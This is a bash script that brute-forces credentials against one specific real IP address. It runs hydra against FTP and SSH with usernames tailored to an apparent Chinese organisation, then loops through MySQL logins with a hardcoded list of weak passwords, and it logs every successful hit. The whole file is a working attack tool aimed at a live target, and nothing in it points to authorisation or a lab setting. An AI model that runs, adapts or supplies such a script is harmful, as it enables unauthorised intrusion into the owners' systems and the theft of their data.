#!/bin/bash
# alszxyy full brute: ftp + ssh + mysql extended
LOG=/tmp/alsz_brute2.log
echo "=== ALSZ BRUTE2 START $(date) ===" >> $LOG
IP=60.205.173.73

# FTP (hydra)
echo "--- FTP ---" >> $LOG
printf 'alszxyy\nalasz\nalaszxy\nadmin\nroot\nftp\nweb\nalashan\n' > /tmp/alsz_users.txt
timeout 400 hydra -L /tmp/alsz_users.txt -P /tmp/pw.txt -t 3 -W 6 -f -o /tmp/hydra_ftp_alsz.txt ftp://$IP >> /tmp/alsz_hydra.log 2>&1
grep -i "valid password\|host:" /tmp/hydra_ftp_alsz.txt >> $LOG 2>/dev/null
echo "FTP_DONE" >> $LOG

# SSH (hydra)
echo "--- SSH ---" >> $LOG
timeout 400 hydra -L /tmp/ssh_users.txt -P /tmp/pw.txt -t 3 -W 6 -f -o /tmp/hydra_ssh_alsz.txt ssh://$IP >> /tmp/alsz_hydra2.log 2>&1
grep -i "valid password\|host:" /tmp/hydra_ssh_alsz.txt >> $LOG 2>/dev/null
echo "SSH_DONE" >> $LOG

# MySQL extended
echo "--- MYSQL EXT ---" >> $LOG
for u in root alszxyy alsz alashan admin mysql dbuser; do
  for pw in 123456 admin admin123 alszxyy123 alsz123 123456789 root123 alashan123 888888 666666 123123 mysql123 12345678 a123456 admin888 root; do
    timeout 5 mysql -h $IP -P 3306 -u "$u" -p"$pw" -e "select 1" >/dev/null 2>&1
    if [ $? -eq 0 ]; then echo "MYSQL_HIT $u/$pw" >> $LOG; fi
  done
done
echo "MYSQL_DONE" >> $LOG
echo "=== ALSZ BRUTE2 END $(date) ===" >> $LOG
